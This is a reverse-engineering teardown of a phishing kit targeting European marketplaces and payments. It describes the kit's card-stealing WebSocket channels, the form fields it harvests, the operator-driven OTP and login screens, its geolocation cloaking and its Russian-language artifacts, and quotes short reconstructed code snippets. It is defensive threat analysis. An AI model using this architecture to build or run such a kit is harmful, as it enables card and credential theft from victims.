# KIT CODE ANALYSIS — Reverse-Engineering Teardown
**Companion to `FULL_OPERATION_DOSSIER_marketplace_phishing.md`.** Every item here is read **directly from the kit's own client JavaScript** and quoted literally — confidence **[H]** throughout.

- **Compiled:** 2026-06-15 (UTC).
- **Source:** the kit's client bundle, recovered from urlscan's stored response bodies (scans `019ec607` = olx.paycore24-express.sbs, `019ecbd3` = olx.express-paycore24.cyou) → fetched via `https://urlscan.io/responses/<sha256>/` → brotli/gzip-decompressed. Working copies + hashes: **`kit-source/raw_bodies/`** (72 raw) and **`kit-source/decompressed/`** (decompressed, with `SHA256SUMS.txt`).
- **Method:** static analysis of decompressed JS. Snippets below are reconstructed from minified code; **all endpoint/string literals are preserved verbatim**.

---

## 1. Build & framework
- **Next.js 16.2.7** (App Router) bundled with **Turbopack** (production build), **React 19.2.7**, **Emotion** (CSS-in-JS), split into **~70 JS chunks** + a CSS chunk. Exact version is literal in the bundle: `next@16.2.7`, `react@19.2.7`, `react-dom@19.2.7`.
- Server-rendered HTML shell (`<div id="site-root">`) hydrated client-side; per-victim content fetched at runtime.
- A leftover **`ws://localhost:5002` / `http://localhost:5002`** dev fallback (see §12) shows a normal local-dev → build → deploy pipeline.

## 2. Entry & per-victim token
Entry URL: `https://<brand>.<domain>.<tld>/a/<base64token>?us=<channel>`.
The client base64-decodes the token (`atob`) to `2/<id>`:
```
"Mi8zRFdpNjBQbmFS"  → atob →  "2/3DWi60PnaR"
"Mi9XT0tHSjNwUjk0"  → atob →  "2/WOKGJ3pR94"
"Mi9mNGY2blplM1E4"  → atob →  "2/f4f6nZe3Q8"
```
- `2/` = kit stage/version constant; `<id>` = the per-victim backend record key (item, price, fake buyer, address, order ID).
- `?us=` = delivery-channel tag (`gm | dlm | sml | ym`).
The decoded `<id>` + brand are then used to load the victim page (see §3).

## 3. Route map (victim-facing) — live-confirmed
| Route | Purpose |
|---|---|
| `/a/<token>` | lure entry |
| `/helpdesk/<decoded-id>/<brand>` | personalised fake listing, loaded in an iframe: `src=\`/helpdesk/${e}/${n}\`` (e=decoded id, n=brand, e.g. `/helpdesk/f4f6nZe3Q8/olx`) |
| `/m/<token>/<service_method>` | **card-capture module** (see §7) — e.g. `/m/<token>/c3RyaXBl` (`c3RyaXBl`=`stripe`) |
| `/cdn/<32-hex>` | static assets |
| `/static/helpdesk/audio/*.mp3` | chat notification sounds (`blackberry.mp3`) |
| `/api/v1/storage/<date>/<asset>` | baked-in brand template docs (§10) |
| `/geoip` (→ `api.ip.sb`) | cloak/geo check (§9) |
| `/api/ws/stripe/sync`, `/api/ws/sync`, `/ws/helpdesk` | WebSockets (§6) |
| `/` | returns **404** (not crawlable) |

## 4. Transport base-URL derivation (the C2 is same-origin)
```js
D = () => (window ? window.location.hostname : "")
T = a => a.includes("localhost") || a.includes("127.0.0.1") || a.includes("0.0.0.0")

getWsBaseUrl  = () => { let a = D(); return (!a || T(a)) ? (env.WS_BASE_URL  ?? "ws://localhost:5002")   : `wss://${a}` }
getApiBaseUrl = () => { let a = D(); return (!a || T(a)) ? (env.API_BASE_URL ?? "http://localhost:5002") : `https://${a}` }

normalizeToWs = d =>
  d.startsWith("http://")  ? d.replace("http://","ws://")  :
  d.startsWith("https://") ? d.replace("https://","wss://") : d
```
**Meaning:** in production the exfil host is just the page's own hostname over `wss://` — **the C2 is self-hosted on the phishing domain** (Cloudflare-fronted). `WS_BASE_URL`/`API_BASE_URL` are build-time env overrides; the `localhost:5002` fallback is the developer's machine.

## 5. The reconnecting WebSocket client (`WebSocketProvider`)
Key members (verbatim names): `manualClose`, `setStatus(...)` (states `connecting`/`error`/`closing`/`closed`), `computeNextDelay()` driven by a `backoffMs` array, `reconnectTimeoutId`, optional `protocols`, and the socket itself `new WebSocket(this.url[,this.protocols])`.
```js
// on socket close:
if (this.manualClose) { setStatus("closed"); return }   // honour intentional close
setStatus("error"); let d = this.computeNextDelay(); /* schedule reconnect */
// server-driven stop:
if (this.disconnectData?.reason) { /* "not reconnecting:", reason */ return }
```
→ A resilient, auto-reconnecting real-time channel; the **server can instruct the client to stop reconnecting** (`disconnectData.reason`).

## 6. The three channels + the helpdesk chat protocol
```js
// operator console:
init({ provider:"websocket", url:`${getWsBaseUrl()}/ws/helpdesk`,      params:{ ad_id:<id> } })
// card/payment relay:
init({ provider:"websocket", url:`${getWsBaseUrl()}/api/ws/stripe/sync`, params:{ ad_id:<id>, service_method:<...> } })
// state sync:
init({ provider:"websocket", url:`${getWsBaseUrl()}/api/ws/sync` })
```
**Helpdesk chat events** (`_.on("<event>")`) — a full bidirectional protocol:
`connected`, `disconnect`, `error`, `messages` (load history), `message_read`, `message_delete`, `send_message_result`, `open_helpdesk_widget`, `close_helpdesk_widget`.
→ The operator and victim exchange messages in real time; the operator can mark-read and **delete** messages and open/close the widget remotely. This is the live "Chat supporto / Operatore" seen in the screenshots.

**Wire protocol (passively extracted — no live connection made):**
- Transport: JSON frames — `socket.send(JSON.stringify(...))`.
- Primary telemetry message: `{ type:"ad:event", data:{ visor_id:"", ad_id:<id>, event_type:<EventType>, event_data:<payload> } }`.
- **`EventTypes` enum streams every victim action live** to the operator: `EnterFullNameEvent`, `EnterEmailInputEvent`, `EnterContactFormEvent`, … (card-entry events follow the same shape) → the operator **watches each field as it is typed**.
- Chat message frames: `type:"get_messages"`, `type:"helpdesk"`; rendered with markers `hd-message-client` / `hd-message-operator`; product display via `product-price-formatted` / `product-currency`.
- **Card schemes recognised in code:** visa/mastercard + `discover`, `elo`, `hiper`, `hipercard` (the last three are **Brazilian** card brands → confirms BR targeting / `stripe/br`).

## 6b. Operator control plane — how the operator *drives* the victim's page [H]
*Added 2026-10-13. Located with REA's static JavaScript analyzer (`.claude/skills/reverse-engineer-anything`, `rea-agents@6.4.0`, run over the 69 intact JS chunks: 0 parse failures, Evidence `ev_5194e593…`, graph `jag_a6e75ef8…`); every item below is a literal from the cited chunk at the cited character offset. Static reading only — no socket was opened.*

§6 covers what flows **victim → operator** (`ad:event`). The same payment socket also carries the reverse direction: **the operator remotely switches which screen the victim sees.** All in the `useSync` hook, chunk `170e4bae9438`.

- **One URL template for the payment socket:** `${getWsBaseUrl()}/api/ws/${wsConnectorType}/sync` (`@16424`) with `{ad_id, service_method}`. Only `wsConnectorType:"stripe"` is set literally in the bundle (4 chunks); the code also branches on `"viewer"` and `"merchant"`, so `/api/ws/viewer/sync` and `/api/ws/merchant/sync` are **probable** sibling endpoints [M].
- **Handshake:** on connect the client logs `ws connected` and sends `{type:"setup:refresh", data:["ad:info","bank:list","ad:step","ad:change-lk-qrcode"]}` (`@13994`) — subscribing to four server-push events. A server error `"[WS-PAY] failed to get ad for ad is banned"` forces a reload (operator-side ban of a victim link).
- **Server → victim events:**

| Event | What the operator pushes | Effect in the victim's browser |
|---|---|---|
| `ad:info` (`@13799`) | the fake listing + per-country method config | sets allowed / required payment methods (`traffic` mode: `card`,`bank`, **+`blik` if country = PL** `@14424`) |
| `bank:list` (`@13809`) | list of banks | populates the fake "choose your bank" screen |
| `ad:step` (`@13821`) | the **next screen**, as a step string | re-renders the page (grammar below) |
| `ad:change-lk-qrcode` (`@13832`) | `bank_qr_codes` | swaps in a **bank QR code** live on the bank (`lk-*`) screen |

- **Step grammar** (`parseStep`, `@9126`): prefixes `dialog-` (modal), `lk-` (bank / "личный кабинет" screen), `verify-` (OTP / 3-DS), `login-` (credential screen); suffixes `-waiting` (spinner — operator is working), `-invalid` (show "wrong code, try again"), `-qrcode` (QR variant). E.g. `lk-…-waiting` → `lk-…-invalid` is how the operator makes a victim **re-enter** a code that failed at the real bank.
- **Notable dialogs:** `have_money` (`@14896`) — "do you have this much on the card?", with default amounts **SE 3500 / DK 2500 / otherwise 300** in local currency (`@15197`); `redirect_link` — operator sends the victim to **any URL**, `permanent` or `once` (de-duplicated via `localStorage["redirect_link_temporary"]`, `@15594`).
- **Operator "permit" switches** on the listing (`ad.variables.*`): `permit_bank` (force a specific bank page or `"select"`), `permit_verify`, `permit_login` (jump to OTP / login screens), `pixels` (tracking pixels). A leftover `console.log("ad.variables.permit_bank", …)` (`@18057`) ships in production. Self-reload guards use `sessionStorage` keys `__verify_reload_<ad>_<x>` / `__login_reload_<ad>_<x>`.
- **Presence telemetry, precisely:** `{type:"ad:activity", data:{date, fingerprint, ipinfo, user_agent}}` every **2 s**, but only while the tab is visible **and** the victim was active in the last **2 min** (`@16997`); plus `{type:"ping"}` every **3 s** (`@19476`). The fingerprint (`getOrCreateFingerprint`, `@7698`, stored in `localStorage["fingerprint"]`) = UUID + base64 of UA|language|platform|screen W×H×depth|timezone|random.
- **Russian developer string:** `useStore должен использоваться внутри StoreProvider` ("useStore must be used inside StoreProvider", `@8439`) — adds to §12b: Russian appears in **developer error messages**, not just operator UI.

**Scam-mode map and URL grammar** (chunk `18a24e775994`, `@6500–7950`). The token's first segment is a scam-mode code, extending §12b(c) beyond `2/`:

| Code | Mode | | Code | Mode |
|---|---|---|---|---|
| `2` | `2_0` (Выплата / payout 2.0) | | `f` | `refund` |
| `1` | `1_0` (Покупка / purchase 1.0 [M]) | | `t` | `traffic` |
| `r` | `rental` | | `mv` | `multiple_verify` |
| `v` | `verify` | | `dp` | `dialog_push` |

Victim URLs, with `X = base64("<code>/<tag>")` (padding stripped): `/a/X` (lure; also the eBay/Etsy payment link) · `/m/X/<b64 service>` (payment) · `/login/X/<b64 service>` · `/verification/X/<b64 service>` · `/viewer/<b64 type>/<b64 service>/<adtag>` (bank page; **`?q=1` = bank-QR variant**, `GetBankQRCodeUrl`).

**Payment-rail routing** (`checkPaymentSupport`): card/BLIK → `stripe`, or `ebay`/`etsy` for those templates; bank/"lk" step → **`twint` (CH)**, **`interac` (CA)**, otherwise `stripe`, overridden per template by **`western_union`**, **`csdd`** (template `csdd_verify` — Latvia's CSDD road-traffic/vehicle registry) and **`epaslaugos`** (Lithuanian e-services portal). The last two are **new targets** beyond the §10 brand list: a government vehicle-registry / e-gov lure for LV and LT [H literal; brand identity M].

**Coverage gap (see §14):** 67 more chunks archived by the hash-chaining monitor (incl. six ≈173 KB rebuilds of this payment chunk) were corrupted at capture and are not covered above; they are queued for automatic re-fetch.

## 7. Card capture & the payment module
- Route: **`/m/<token>/<service_method>`**, where `service_method` = **`stripe/<country>`**.
- **34 country variants** present in code: `at au be bg br ca ch cz de dk ee es fi fr gb hk hr hu is it lt lv md nl no nz pl pt ro se sg sk us`. → the kit tailors the (fake) Stripe flow per victim country.
- **Harvested field names (literal):** `card_number`, `card_cvv`, expiry, `billingName`, `billingCity`, `billingState`, `billingZipCode` (+ `login`, `password`, `phone`, `pin` from the credential step).
- Card data is **streamed over the `/api/ws/stripe/sync` WebSocket** (with `ad_id` + `service_method`), **not** an HTTP POST → real-time exfil to the operator.
- **No real Stripe is used client-side** — the bundle contains **no `js.stripe.com`, no `pk_live/pk_test` key, no `client_secret`/`payment_intent`/`confirmCardPayment`/Stripe Elements**. "Stripe" here is (1) **trust-brand theater** on the fake page and (2) an **internal label/router** (`service_method = stripe/<country>`). The kit captures the **raw PAN+CVV** and ships it to the operator — the exact opposite of what real Stripe does (tokenise so the merchant never sees the card). Any real charge happens on the operator's hidden backend (inference [M]).
- Service segment is UTF-8-safe base64: `/m/${token}/${btoa(unescape(encodeURIComponent(service)))}` → e.g. `c3RyaXBl` = `stripe`.

## 8. BIN lookup / bank tailoring
The kit enriches the stolen card via BIN-lookup services (literal): **`lookup.binlist.net`** and **`data.handyapi.com`** with path **`"/bin/"`**. → the card's first digits identify the issuing bank/country/scheme, so the kit can present the matching fake bank / 3-D-Secure screen and route by `stripe/<country>`.

## 9. Cloaking / geolocation
Client-side call to **`https://api.ip.sb/geoip`** returns the visitor's ip/city/region/country/asn — feeding the cloaking decision (residential vs datacenter, correct country) alongside the one-time token and real-browser check. Non-matching visitors get the benign decoy.

## 10. Brand templates, localization & storage
- **`/api/v1/storage/<date>/<asset>`** serves baked-in brand legal docs — recovered assets are **Romanian**: `Politica_de_confiden[tialitate]`, `Accesibilitate_subunitati_postale_2025`, plus `Cookies_…`.
- Full **`/ro/…` route tree** present (`/ro/landing/payment`, `/ro/info/{about,ad,apps,privacy-policy,recommendations,rules}`, `/ro/blog`, `/ro/sitemap`) → Romania fully localized.
- **Impersonated-brand portfolio** (hard-coded legit login/redirect URLs in the bundle): Allegro (PL), Bazar.bg (BG), Blocket + Bytbil (SE), iMarked/Finn (NO), Anibis + Tutti (CH), Laendleanzeiger (AT), TradeMe (NZ); postal/courier **Correos (ES), Posta Moldovei `posta.md` (MD), Balíkovna (CZ), SelfAWB/Posta Română (RO)**, OMNIVA; payment **Vipps MobilePay (NO/DK)** — consistent with the 34-country `stripe/<cc>` list. Marketplaces + postal + payment brands across Europe, plus AU/BR/CA/HK/SG/US/NZ.

## 11. Other third-party calls
- **`v2.simpalsid.com/graphql`** (POST) — Simpals/OLX identity API (credential relay/validation).
- **`nominatim.openstreetmap.org/reverse`** — reverse-geocoding the victim's location.
- **`cdn.jsdelivr.net/.../currency-api`** — currency conversion for the displayed price.

## 12. Notable artifacts / OPSEC slips
- **Dev fallback `ws://localhost:5002` / `http://localhost:5002`** — the kit author's local dev server (built with a real toolchain).
- **Cross-brand data leak** — a Polish product title ("Kolo sportiwne") rendered on an *Italian* Subito page → one shared engine/data-pool.
- **Reused fake-buyer identity** — "Arkadiusz Twardy / ul. Kruczkowskiego 79, Czeladź" appears across multiple OLX victims (scans `019ec607`, `019ecbd3`).

## 12b. Authorship & internal artifacts — RUSSIAN-language evidence [H]
The bundle contains **253 distinct Cyrillic strings** — not just lure text but a developer/operator **admin UI** and **fraud scripts**, establishing **Russian-speaking authorship** at code level.

**(a) Russian WYSIWYG page-builder admin panel** (operators design fake pages in Russian): `Панель настроек шаблона` ("Template settings panel") · `Загрузить лого`/`Заменить лого` ("Upload/Replace logo") · `Свой шрифт` ("Custom font") · `Цвет бренда` ("Brand color") · `Вариант шапки`/`подвала` ("Header/Footer variant") · `Скорость анимаций` ("Animation speed") · `Бейджи магазинов` ("Store badges") · `По-русски` (toggle "In Russian").

**(b) Operator fraud-script strings:** `Кредитные карты не принимаются. Используйте дебетовую карту.` = "Credit cards not accepted. Use a debit card." · `Карта отклонена` = "Card declined" · `логин банка` / `пароль банка` = "bank login / password" · `номер не проходит проверку Луна` = "fails Luhn check".

**(c) Versioned scam scenarios:** `Покупка (1.0)` = "Purchase 1.0", `Выплата (2.0)` = "Payout 2.0". The per-victim token prefix **`2/` = the "Выплата (payout) 2.0" scenario** (seller-payout scam) — this is what the `2/` in `base64⁻¹(token)` means.

**(d) Victim funnel — `EventTypes`, each streamed live to the operator:** `OpenTrafficLinkEvent → OpenPhishingEvent → EnterContactForm/Email/FullName/PhoneNumberBankPreloader → OpenLoginPageEvent → EnterLoginDataEvent → OpenLKPageEvent → EnterLKDataEvent` (LK = `личный кабинет`, "personal account") `→ OpenPaymentEvent → EnterPaymentCardDetailsEvent / EnterPaymentBlikDetailsEvent` (BLIK = Polish payments) `→ EnterVerifyDataEvent` (OTP/3-DS).

**(e) Localized victim lures:** Bulgarian (Bazar.bg) — `Вашите стоки вече са платени от купувача, парите се съхраняват от нашата услуга…` = "Your goods are already paid by the buyer, the money is held by our service…".

**(f) Misc:** components `WebSocketProvider`/`DialogIframe`/`VerifyMainBlock`; English debug logs (`Helpdesk WebSocket connected`) with Russian business strings; localStorage persists harvested PII (`fullName`,`email`,`phone`,`contactForm`,`HD_LAST_STATE`,`redirect_link_temporary`); brand-template paths `/app/anibis-ch-…`, `/app/correos-info/…`, `/app/fan-courier-mobile/…`, `/app/gumtree/…`, `bpost-locale`, `ups-locale`.

**Conclusion:** developers/operators are **Russian-speaking** (code-level, not inference) — the **Classiscam/Telekopye** profile. The kit is a productized, versioned, multi-language **page builder**, not a one-off page.

## 13. Endpoint reference (quick table)
| Endpoint | Type | Purpose |
|---|---|---|
| `/a/<base64token>?us=<ch>` | page | lure entry (token→`2/<id>`) |
| `/helpdesk/<id>/<brand>` | page (iframe) | personalised fake listing |
| `/m/<token>/stripe/<cc>` | page | card-capture module (per-country) |
| `/viewer/<b64 type>/<b64 service_method>/<adtag>` | page | bank-tailored fake login (template `/viewer/[TYPE_B64]/[SERVICE_METHOD]/[ADTAG]`; live example `aXBrbw`=`ipko`, `Ml8w`=`2_0`, urlscan 019ee4df) |
| `/cdn/<hash>` | asset | kit assets |
| `/static/helpdesk/audio/*.mp3` | asset | chat sounds |
| `/api/v1/storage/<date>/<asset>` | api | brand template docs |
| `wss://<host>/ws/helpdesk` | websocket | operator↔victim chat/control |
| `wss://<host>/api/ws/stripe/sync` | websocket | **card-data exfil** |
| `wss://<host>/api/ws/sync` | websocket | state sync |
| `wss://<host>/api/ws/{viewer,merchant}/sync` | websocket | probable sibling connectors of `stripe/sync` [M] (§6b) |
| `/login/<b64 mode/tag>/<b64 service>` | page | operator-pushed credential screen (§6b) |
| `/verification/<b64 mode/tag>/<b64 service>` | page | operator-pushed OTP / 3-DS screen (§6b) |
| `/viewer/…?q=1` | page | bank-QR-code variant of the bank page (§6b) |
| `api.ip.sb/geoip` | 3rd-party | cloak/geo check |
| `lookup.binlist.net`, `data.handyapi.com/bin/` | 3rd-party | BIN→bank |
| `v2.simpalsid.com/graphql` | 3rd-party | OLX/Simpals auth relay |
| `nominatim.openstreetmap.org` | 3rd-party | reverse geocode |
| `cdn.jsdelivr.net` currency-api | 3rd-party | price currency |

## 14. Evidence & integrity
- Decompressed source: `kit-source/decompressed/` (+ `SHA256SUMS.txt`); raw bodies: `kit-source/raw_bodies/`. Each file is named by urlscan's content hash = **sha256 of the decoded body**, so every sample is self-verifying (`node monitor/kit-body.js audit kit-source/raw_bodies` lists any that fail).
- **Integrity incident (found 2026-10-13):** 67 of 139 raw bodies archived by the monitor's hash-chaining were captured with `body="$(…)"`; bash command substitution drops every `0x00` byte, so those gzip bodies are irrecoverably damaged (header `1f8b0800 00000000 0003` → `1f8b0803`; only ≈2.7 % of their text decodes, and back-references after the first lost byte copy the wrong text — none of it is used as evidence). A guided NUL-reinsertion repair verified against the content hash was attempted and did not converge. Fix: bodies now stream to a file and are archived only if they verify (`monitor/kit-body.js`), and each keyed monitor run **re-fetches** failing bodies from urlscan (≤25/run), restoring them while urlscan still retains them.
- Rendered captures/screenshots: `screenshots/019ec607-….png`, `019ecbd3-….png`.
- Every endpoint/field/event above is a literal string from the bundle; nothing inferred is presented as code. The **operator console** is the authenticated peer of `/ws/helpdesk`; its admin/login URL is **not** present in the client code (separate, Cloudflare-hidden infra → obtainable via a Cloudflare abuse / legal-disclosure request).
